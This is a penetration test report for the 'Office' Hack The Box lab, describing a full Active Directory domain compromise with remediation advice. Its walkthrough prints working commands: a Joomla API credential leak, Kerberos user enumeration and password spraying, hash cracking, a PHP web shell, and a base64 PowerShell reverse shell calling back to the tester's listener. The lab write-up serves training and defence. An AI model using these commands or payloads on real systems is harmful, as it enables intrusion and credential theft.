---
title: Office Active Directory Penetration Test
topic: [AD Reports, PT Reports]
---

Office - HTB Labs - Active Directory Penetration Test

Report of Findings

09-10-2024

## Table of Contents
1. [Executive Summary](#executive-summary)
	- [Approach](#approach)
	- [Scope](#scope)
	- [Assessment Overview and Recommendations](#assessment-overview-and-recommendations)
2. [Network Penetration Test Assessment Summary](#network-penetration-test-assessment-summary)
	- [Summary of Findings](#summary-of-findings)
3. [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough)
	- [Detailed Walkthrough](#detailed-walkthrough)
4. [Remediation Summary](#remediation-summary)
	- [Short Term](#short-term)
	- [Medium Term](#medium-term)
	- [Long Term](#long-term)
5. [Technical Findings Details](#technical-findings-details)
6. [Appendices](#appendices)
	- [Appendix A - Finding Severities](#appendix-a---finding-severities)
	- [Appendix B - Exploited Hosts](#appendix-b---exploited-hosts)
	- [Appendix C - Compromised Users](#appendix-c---compromised-users)
	- [Appendix D - Changes/Cleanup](#appendix-d---changescleanup)
	- [Appendix E - Additional References](#appendix-e---additional-references)


## Executive Summary

The Active Directory penetration test was conducted by Omar(hereinafter referred to as the "tester") to assess security flaws in the 'Office' AD environment with the purpose of determining security impact of successful exploitation, documenting all findings, and providing recommendations to mitigate the issues found. 


### Approach
The tester performed the assessment under a “Black Box” approach with no additional information, credentials, or access to any services. All testing was preformed from the testers work machine with a clean VM install. Testing was preformed ensuring confidentiality, integrity, and availability of the service would not be further compromised or affected during the assessment. The goal of the assessment was to identify and exploit any flaws, mis-configurations, or vulnerabilities while clearly demonstrating security impact and meticulously documenting each step in a reproducible manner along the way.    

### Scope
The scope of this audit included ONE external IP address and any Active Directory environment discovered from successfully exploiting the external host.

In-Scope Assets:

| IP/Host        | Description     |
| -------------- | --------------- |
| 10.129.230.226 | Web - `DC` host |

### Assessment Overview and Recommendations

During the course of the assessment against the Office AD environment, the tester identified six(6) findings that pose a considerable risk to the confidentiality, integrity, and availability of `Office`'s information systems.

Throughout the engagement, the tester noted that Office's Windows operating systems were patched and up-to-date. All issues discovered throughout the assessment involved improper web service isolation, accessible sensitive information, password re-use, or unnecessary user privileges.

The first finding was related to an un-patched, out-of-date web service with known public vulnerabilities. The vulnerability allows for the retrieval of personal account information for all registered users, including their full name, username, and email addresses. This is especially dangerous as this attack is publicly known, with readily available tools to automate it, thus requiring little-to-no skill. Further, this same flaw in the web service allows for an attacker to retrieve the username and plain-text password of the user running the database. While the database is well guarded and only accessible internally, any un-authorized disclosures of passwords is dangerous as users tend to re-use them across different services within the network. 

The next finding involved sensitive information being included in a network share. In this instance, a file belonging to an internal team is readily available on a network share, this contained details required to guess, or 'crack', the plain-text password of a domain user. Any files containing credentials, even when they aren't in plain-text('hashed') should never be placed on a network share or backed up. Ensure the team is mindful of any sensitive data within documents and they ensure to never make these readily available in a network share, especially when accessible by multiple users.   

The tester also discovered that some users are using weak, common passwords. These are passwords that can easily be guessed(via 'password cracking') and used to gain unauthorized access to the system or service as those users. Further, the tester discovered instances in which a password was re-used across multiple different services, this is especially dangerous as it means if one service is compromised by an attacker, they would automatically be able to access and compromise other services or systems using the same password. To avoid such cases, a strong password policy should be set and enforced throughout the organizations, requiring users to create long(16+ character) passwords with numeric and special characters. These passwords should be rotated('changed') often and not be re-used across multiple different systems or services.

Finally, the tester discovered that there exists inadequate privilege control on Active Directory domain-joined users, with multiple accounts holding extremely high and likely unnecessary privileges that allow for full domain compromise. One of these users had the ability to modify and disable vital security features that are necessary and enabled by default. In another instance, a user was a member of an extremely high privileged group, that allowed for full compromise of the domain controller, and thus the entire domain. This is especially dangerous as full control over a domain potentially gives an attacker the ability to read, write, and modify files, users, and critical services effectively compromising the confidentiality, integrity, and availability of all of `Office`'s services running within that domain.

A [Remediation Summary](#remediation-summary) that includes short, medium, and long term recommendations is incorporated in this report. This should be used to devise a remediation plan that will correct the findings in this report and strengthen Office's overall security posture.

---
## Network Penetration Test Assessment Summary

The tester began the assessment from the standpoint of a unauthenticated user on the internet. No credentials, configurations, or knowledge of the underlying systems was given to the tester. The tester solely received an IP address for a host located on the internet.


### Summary of Findings

Throughout the assessment, the tester uncovered six(6) findings that pose a considerable risk to the web service and the underlying `Office` Microsoft Active Directory environment. Each finding on its own was quantified individually, ranging from medium to critical, however a complete chain detailing how the findings were used together is included in the [Internal Network Compromise Walkthrough](#internal-network-compromise-walkthrough) section of this report.



Below is a list of all findings discovered throughout the course of the assessment. More details, including descriptions, impact, affected services, remediation, references, and evidence is included in the [Technical Findings Details](#technical-findings-details).


| Finding # | Severity | Finding Name                                                                     |
| --------- | -------- | -------------------------------------------------------------------------------- |
| 1         | Critical | Excessive AD domain user privileges                                              |
| 2         | High     | Password re-use across multiple services                                         |
| 3         | High     | Weak active directory credentials                                                |
| 4         | High     | Sensitive files on SMB share                                                     |
| 5         | High     | Sensitive information leak on vulnerable web service                             |
| 6         | Medium   | Abusing web-service built-in functionality to achieve RCE(Remote Code Execution) |

---
## Internal Network Compromise Walkthrough

Throughout the penetration test, the tester was able to gain a foothold on the Active Directory environment by leaking MySQL credentials from the external vulnerable `Joomla!` service and move laterally through the machine, gaining full `nt authority\system` access to the `DC.office.htb` domain controller, and thus control over the entire domain and all its users. Included in this section are detailed steps that demonstrate the attack chain used, starting from the point of view of an unauthenticated user to compromising the entire machine. This walkthrough is meant to show how the flaws discovered can be fit together to achieve full system compromise, more information detailing each individual flaw can be found in the [Technical Findings Details](#technical-findings-details) section of this report.


### Detailed Walkthrough
Included below are the high-level steps taken by the tester to compromise the `office.htb` Active Directory domain.

1. The tester first began by preforming a port scan of the network with the [nmap](https://github.com/nmap/nmap) tool, this revealed the presence of a Joomla Blog on port 80(HTTP) of `10.129.230.226`. It was also noted that this host is also the domain controller.
2. After the Joomla instance was fingerprinted, it was determined to be running version 4.2.7 which is vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752). The tester leveraged this vulnerability to request the username and clear-text password of the joomla_db user from the publicly accessible `api/index.php/v1/config/application` endpoint. The tester then leveraged the same vulnerability on another publicly accessible endpoint, `api/index.php/v1/users` to retrieve the full name, username, and email for all registered users, including the administrator account.
3. The tester then used the [kerbrute](https://github.com/ropnop/kerbrute) tool to enumerate valid usernames on the active directory domain via attempted Kerberos authentication. This was used with [jsmith.txt](https://github.com/Greenwolf/Spray/blob/master/name-lists/statistically-likely-usernames/jsmith.txt), a wordlist that contains statistically likely usernames. This resulted in the discovery of 6(six) valid users for the `office.htb` domain.
4. The tester again leveraged the kerbrute tool, this time to preform a password spray attack against the 6 previously found users using the previously obtained `joomla_db` credentials. This resulted in the successful authentication to the `dwolfe` domain-joined user via password re-use from the Joomla mySQL database account.
5. With access to the `dwolfe` AD(Active Directory) user, the tester discovered an accessible SMB share named `SOC Analysis` on the `DC.office.htb` host. The tester used [smbclient.py](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) from the impacket suite to connect to the SMB share.
6. Within the `SOC Analysis` SMB share, a packet capture file named `Latest-System-Dump-8fbc124d.pcap` was discovered and downloaded to the testers machine. This file was analyzed using the [Wireshark](https://github.com/wireshark/wireshark) packet analysis tool which lead to the discovery of Kerberos Pre-Authentication packet, containing a 'guessable'(via offline password cracking) cipher for the `tstark` domain user.
7. The cipher was successfully cracked with the [hashcat](https://github.com/hashcat/hashcat) tool using mode 19900(Kerberos 5, etype 18, Pre-Auth). This revealed the plain-text password for the `tstark` user.
8. The tester noted that `Tony Stark` was the administrator name of the Joomla admin user previously pulled from the vulnerable `api/index.php/v1/users` endpoint. This knowledge was used to discover an instance of password-reuse across both the AD domain and the Joomla Blog external service. This lead to access to the Joomla Blog Administration portal as the `tstark` admin user.
9. With administrator access to the Joomla service, the tester navigated to System->Site Templates and customized the `offline.php` cassiopeia theme file to append a PHP web-shell. 
10. The tester then crafted a base64 encoded PowerShell reverse-shell payload using the [revshells](https://www.revshells.com/) web-tool and started a nc(netcat) listener before sending the payload to the previously placed PHP webshell located at the `templates/cassiopeia/offline.php` endpoint. This granted shell level access to the `DC` host as the `office\web_account` domain user.
11. The `DC` host was first enumerated, revealing multiple interesting files and some web services not exposed externally. To access these services, the tester copied over the [ligolo-ng](https://github.com/nicocha30/ligolo-ng) tool and started a tunnel between the testers machine and the `DC` host. This tool is typically used as a proxy to pivot further into the network or across multiple networks on multi-network-interface enabled machines, in this instance however the tester leveraged this tool to access the localhost services running on the `DC` host via `ligolo-ng`'s local-access `240.0.0.0` subnet.
12. Hosted only locally, the tester discovered a job application web portal running on port 8083 for "Holography Industries". The tester noted the web application had a proper file upload whitelist and only allowed the `.doc`, `.docx`, `.docm`, and `.odt` file formats to be uploaded. With this in mind, the tester first disabled OpenOffice macro security using the `tstark` accounts `Registry Editors` group member privileges.
13. The tester then used metasploit-frameworks msfconsole with the `multi/misc/openoffice_document_macro` module to generate a `.odt` file with a malicious macro built-in that will establish a reverse meterpreter shell as the user opening the document. This malicious `resume.odt` file was then uploaded to the web portal. Following a few minutes of wait time, the malicious `resume.odt` was opened, this granted the tester a meterpreter session to the machine as the `office\ppotts` domain user.
14. As the `office\ppotts` user, the tester discovered saved credentials for the `office\hhogan` user using the Windows `cmdkey` command line tool. The master key for the `ppotts` domain user was retrieved from `C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\` and the encrypted credential from `C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\`. Using the [mimikatz](https://github.com/gentilkiwi/mimikatz) tool, the masterkey was decrypted and used to decrypt the saved credential for the `hhogan` domain user, revealing the clear-text password for the user.
15. Next, the tester then ran [bloodhound.py](https://github.com/dirkjanm/BloodHound.py), a collection service for the [BloodHound GUI](https://github.com/BloodHoundAD/BloodHound) application, this is an application that will use a graph database([neo4j](https://github.com/neo4j/neo4j)) to visualize user/group privileges and other relationships between various Active Directory objects. This revealed that HHogan being a member of `GPO MANAGERS`, has `GenericWrite` privileges over the `Default Domain Controllers Policy` allowing for a new policy to be pushed to the GPO. 
16. The `GPO MANAGERS` group  was leveraged by the tester through the `HHogan` account to push a policy that triggers an immediate scheduled task as `NT AUTHORITY\System` that adds a local administrator account to the `DC` host.
17. Finally, with local administrator access to the Domain Controller, the tester used Impacket's [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to preform a DCSync attack, this dumped the SAM and NTDS DB, giving access to all local(SAM) and domain users(NTDS) NTLM password hashes. The tester further demonstrated full control over the domain controller, and thus the `office.htb` domain by authenticating as the domain administrator with the NTLM hash(via PtH or Pass-the-Hash) and using Impacket's [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py) to gain a remote session as the `nt authority\system` user. 




Included below is the exact reproduction steps taken, showing every part of the attack chain, including detailed evidence for the chain: 

The tester began with a port scan using the nmap tool to enumerate running services on the host. 

This resulted in the discovery of a joomla blog on HTTP(TCP/80):
![Initial Joomla Enum](assets/images/office/jooma-enum.png)


The tester fingerprinted the Joomla version by looking at the publicly accessible `joomla.xml` file on the `/administrator/manifests/files/joomla.xml` endpoint. 
```console?prompt=$
└─$ curl http://10.129.230.226/administrator/manifests/files/joomla.xml | grep 'version'    

<?xml version="1.0" encoding="UTF-8"?>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>4.2.7</version>
```

The tester searched for known vulnerabilities for `Joomla v4.2.7` and discovered a [publicly known](https://www.exploit-db.com/exploits/51334) vulnerability that allowed the tester to leak the clear text credentials for the Joomla mysql database user as well as the Administrator's name, username and email. 

```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/config/application?public=true

{
  "links": {
    "self": "http://10.129.230.226/api/index.php/v1/config/application?public=true",
    "next": "http://10.129.230.226/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://10.129.230.226/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
<SNIP>
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "root",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "<REDACTED>",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla_db",
        "id": 224
      }
<SNIP>
  ],
  "meta": {
    "total-pages": 4
  }
}                                                                               

```


```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/users?public=true

{"links":{"self":"http:\/\/10.129.230.226\/api\/index.php\/v1\/users?public=true"},"data":[{"type":"users","id":"474","attributes":{"id":474,"name":"Tony Stark","username":"Administrator","email":"Administrator@holography.htb","block":0,"sendEmail":1,"registerDate":"2023-04-13 23:27:32","lastvisitDate":"2024-01-24 13:00:47","lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}}],"meta":{"total-pages":1}}
```


The tester discovers the DB username and password:
```
"type": "application"...
    "user": "root",
    "password": "<REDACTED>",
    "db": "joomla_db",
```

The tester used the nxc(netexec) tool to test for NULL sessions while also confirming the host and AD domain names from the initial nmap scan. This resulted in the confirmation that the web service host was also the domain controller for the  `office.htb` AD environment.
```console?prompt=$
└─$ nxc smb 10.129.230.226                     
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
```


The tester then used the kerbrute tool to enumerate valid Active Directory users, this resulted in 6 valid usernames.
```console?prompt=$
└─$ ./kerbrute_linux_amd64 userenum -d office.htb --dc 10.129.230.226 /usr/share/wordlists/jsmith.txt -o ./valid_office_ad_users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/10/24 - Ronnie Flathers @ropnop

2024/09/10 01:09:54 >  Using KDC(s):
2024/09/10 01:09:54 >  	10.129.230.226:88

2024/09/10 01:10:07 >  [+] VALID USERNAME:	 ewhite@office.htb
2024/09/10 01:10:57 >  [+] VALID USERNAME:	 dmichael@office.htb
2024/09/10 01:11:03 >  [+] VALID USERNAME:	 dwolfe@office.htb
2024/09/10 01:11:19 >  [+] VALID USERNAME:	 tstark@office.htb
2024/09/10 01:16:59 >  [+] VALID USERNAME:	 hhogan@office.htb
2024/09/10 01:17:48 >  [+] VALID USERNAME:	 ppotts@office.htb
2024/09/10 01:18:37 >  Done! Tested 48705 usernames (6 valid) in 523.423 seconds

```

The tester again leveraged the kerbrute tool, this time to preform a password spray attack against the 6 previously found users using the previously obtained `joomla_db` credentials.
```console?prompt=$
└─$ ./kerbrute_linux_amd64 passwordspray -d office.htb --dc 10.129.230.226 ./valid_office_ad_users.txt '<REDACTED>'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/10/24 - Ronnie Flathers @ropnop

2024/09/10 02:09:16 >  Using KDC(s):
2024/09/10 02:09:16 >  	10.129.230.226:88

2024/09/10 02:09:16 >  [+] VALID LOGIN WITH ERROR:	 dwolfe@office.htb:<REDACTED>	 (Clock skew is too great)
2024/09/10 02:09:16 >  Done! Tested 6 logins (1 successes) in 0.236 seconds
```

This successfully unveiled the plaintext credentials for the `dwolfe` user, confirming password re-use across multiple services.

The tester then confirmed the login and enumerated SMB Shares with the nxc tool. This revealed the `dwolfe` user has READ access to the `SOC Analysis` SMB share.
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'dwolfe' -p '<REDACTED>' --shares
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\dwolfe:<REDACTED> 
SMB         10.129.230.226  445    DC               [*] Enumerated shares
SMB         10.129.230.226  445    DC               Share           Permissions     Remark
SMB         10.129.230.226  445    DC               -----           -----------     ------
SMB         10.129.230.226  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.226  445    DC               C$                              Default share
SMB         10.129.230.226  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.226  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.230.226  445    DC               SOC Analysis    READ            
SMB         10.129.230.226  445    DC               SYSVOL          READ            Logon server share 
```

Using the impacket-suites `smbclient.py`, the tester connected to the `SOC Analysis` share on the `DC` host as the `dwolfe` user and enumerated the SMB share, reavealing a PCAP file named `Latest-System-Dump-8fbc124d.pcap`. 
```console?prompt=$
└─$ impacket-smbclient dwolfe@10.129.230.226  
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
Type help for list of commands
# use SOC Analysis
# ls
drw-rw-rw-          0  Wed May 10 11:52:24 2023 .
drw-rw-rw-          0  Wed Feb 14 03:18:31 2024 ..
-rw-rw-rw-    1372860  Wed May 10 11:51:42 2023 Latest-System-Dump-8fbc124d.pcap
# get Latest-System-Dump-8fbc124d.pcap

```


The tester downloaded the packet capture file and analyzed it with Wireshark, a packet analysis tool.
![Wireshark Protocol Hierarchy Statistics](assets/images/office/Wireshark-stats.png)
FIGURE: Wireshark Protocol Hierarchy Statistics


The tester discovered another user, `tstark`, in the packets containing Kerberos authentication.
![Wireshark Kerberos Pre-auth packet](assets/images/office/wireshark-kerb-preauth.png)


The tester did some research and found a [article](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/) detailing how these pre-auth kerberos packets can be abused to guess(or 'crack') the associated users password offline.

![Wireshark Kerberos Pre-auth cipher](assets/images/office/kerb-preauth-cipher.png)
The cipher value was grabbed and re-arranged into a format accepted by the hashcat password cracking tool. 
```
$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf5fc
```


The cipher was successfully cracked with the hashcat tool using mode 19900(Kerberos 5, etype 18, Pre-Auth). This revealed the plain-text password for the `tstark` user.
```console?prompt=$
└─$ hashcat -m 19900 tstark.kerb.preauth /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxf5fc:<REDACTED>
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
Hash.Target......: $krb5pa$18$tstark$office.htb$a16f4806da05760af63c56...86f5fc

<SNIP>

Started: Tue Sep 10 02:40:21 2024
Stopped: Tue Sep 10 02:40:45 2024

```

The tester confirmed the credentials via authenticating to SMB
```console?prompt=$
└─$ nxc smb 10.129.230.226 -u 'tstark' -p '<REDACTED>'         
SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.226  445    DC               [+] office.htb\tstark:<REDACTED>
```

The tester recalled the previous Joomla enumeration, which had listed `Tony Stark` as the administrator account on Joomla
```console?prompt=$
└─$ curl http://10.129.230.226/api/index.php/v1/users?public=true
<SNIP>
"attributes":{"id":474,"name":"Tony Stark","username":"Administrator","email":"Administrator@holography.htb",...<SNIP>
```

The tester leveraged this knowledge and discovered password-reuse on the `tstark` account between the Active Directory Environment and the Joomla service.
![Joomla Administration Portal](assets/images/office/joomla-admin-panel.png)

With administrator access to the Joomla service, the tester navigated to System->Site Templates and customized the `offline.php` cassiopeia theme file to append a PHP web-shell
`system($_GET['cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725']);`

NOTE: A random UUID was generated for the PHP web-shell URL parameter to avoid potential drive-by attacks or further compromise by attackers fuzzing parameters on the Joomla service pages during the assessment timeline. 
![Joomla Theme Template Editor](assets/images/office/joomla-theme-editor.png)


The tester makes a GET request to the modified offline.php endpoint, this resulted in remote code execution on the host
```console?prompt=$
└─$ curl http://10.129.230.226/templates/cassiopeia/offline.php?cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725=whoami
office\web_account
```


The tester then used the [revshells](https://www.revshells.com/) web service to create a base64 encoded PowerShell reverse-shell payload. 
![revshells Web Tool](assets/images/office/revshells-webtool.png)

A nc(netcat) listener was started on the testers machine before the PowerShell reverse-shell payload was URL encoded and sent it to the webshell on the offline.php endpoint. 
```console?prompt=$
└─$ curl http://10.129.230.226/templates/cassiopeia/offline.php?cmd_rand_b67e1aac-cf7c-4feb-a46f-03f5da39e725=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgA1ACIALAA4ADAAOAA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D

```


A reverse shell connection was established on the testers listener, granting interactive remote shell access as the `office\web_account` user.
```console?prompt=$
└─$ nc -lvnp 8089 -s 10.10.14.65
listening on [10.10.14.65] 8089 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.230.226] 63475

PS C:\xampp\htdocs\joomla\templates\cassiopeia> whoami
office\web_account
```



The tester enumerated the system and found multiple new user accounts, including an `xampp` directory with a `passwords.txt` file containing credentials for various services:. 
```console?prompt=>
PS C:\> cat xampp/passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):
   User: root
   Password:
   (means no password!)

2) FileZilla FTP:
   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 
   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: <REDACTED> 

4) WEBDAV: 
   User: xampp-dav-unsecure
   Password: <REDACTED>
```


The tester enumerates installed programs and running network services, this lead to the discovery of multiple open ports that are not accessible externally, including WinRDP
```console?prompt=>
PS C:\> netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:8083           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
  <SNIP>
```

The tester noted that while this is the `DC` host and no further hosts will be needed(as there exists no child or cross-forest trusts), compromise of the Domain Controller will compromise the entire domain. With this in mind, the tester still elected to set up a proxy via the [ligolo-ng](https://github.com/Nicocha30/ligolo-ng) tool, while this is typically used on hosts to move further into the network or pivot to new networks via multiple network-interface enabled hosts, in this instance, it is used to trivially access any local services running on the host via `ligolo-ng`'s local-access `240.0.0.0` subnet.

The tester created a new tunnel, enabled it, and added the route to the `240.0.0.1` subnet.
```console?prompt=$
└─$ sudo ip tuntap add user TESTER mode tun ligolo && sudo ip link set ligolo up && sudo ip route add 240.0.0.1/32 dev ligolo 
```


The tester then copied over the ligolo-ng `agent.exe` to the `DC` host via a Python webserver.
```console?prompt=$
└─$ python3 -m http.server -b 10.10.14.65 8080
Serving HTTP on 10.10.14.65 port 8080 (http://10.10.14.65:8080/) ...
10.129.230.226 - - [10/Sep/2024 21:26:09] "GET /agent.exe HTTP/1.1" 200 -
```

This was downloaded to the `web_account` users Temp directory
```console?prompt=>
PS C:\Users\web_account\AppData\Local\Temp> wget http://10.10.14.65:8080/agent.exe -O ".\agent.exe"
```


The tester then started a ligolo-ng proxy session
```console?prompt=$
└─$ ./ligolo_ng_proxy -selfcert -laddr 10.10.14.65:11601
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: 38D5426B26DCCEACAE31B7D982DFDDC0379DC8E533A2F2DD90F01D5FD547E115 
INFO[0000] Listening on 10.10.14.65:11601               
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng »
```

On the `DC` host, agent.exe is used to connect back to the testers machine
```console?prompt=>
PS C:\Users\web_account\AppData\Local\Temp> .\agent.exe -connect 10.10.14.65:11601 -accept-fingerprint 38D5426B26DCCEACAE31B7D982DFDDC0379DC8E533A2F2DD90F01D5FD547E115
```

After connection is established, the ligolo tunnel is started to the `DC` host
```
ligolo-ng » INFO[0047] Agent joined.                                 name="OFFICE\\web_account@DC" remote="10.129.230.226:51093"
ligolo-ng » 
ligolo-ng » session 
? Specify a session : 1 - #1 - OFFICE\web_account@DC - 10.129.230.226:51093
[Agent : OFFICE\web_account@DC] » start
[Agent : OFFICE\web_account@DC] » INFO[0073] Starting tunnel to OFFICE\web_account@DC
```

With the connection established, another nmap scan is conducted to determine services accessible to the tester. This revealed some new accessible services, including mysql, WinRDP, and another HTTP service on port 8083.
```console?prompt=$
└─$ sudo nmap -A 240.0.0.1

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 21:37 MST
Nmap scan report for 240.0.0.1
Host is up (0.065s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
<SNIP>
3306/tcp open  mysql         MySQL 5.5.5-10.4.28-MariaDB
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8083/tcp open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Holography Industries
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-methods: 
|_  Potentially risky methods: TRACE

<SNIP>

Nmap done: 1 IP address (1 host up) scanned in 105.98 seconds

```


The tester confirms access through the `ligolo` tunnel with the nxc tool via testing WinRDP access
```console?prompt=$
└─$ nxc rdp 240.0.0.1 -u 'tstark' -p '<REDACTED>'     
RDP         240.0.0.1       3389   DC               [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC) (domain:office.htb) (nla:True)
RDP         240.0.0.1       3389   DC               [+] office.htb\tstark:<REDACTED> 
```

The tester then navigated to the HTTP service running on port 8083 via a web-browser, this revealed a new web application for "Holography Industries"
![New Site Enumeration](assets/images/office/holo-web-enum.png)

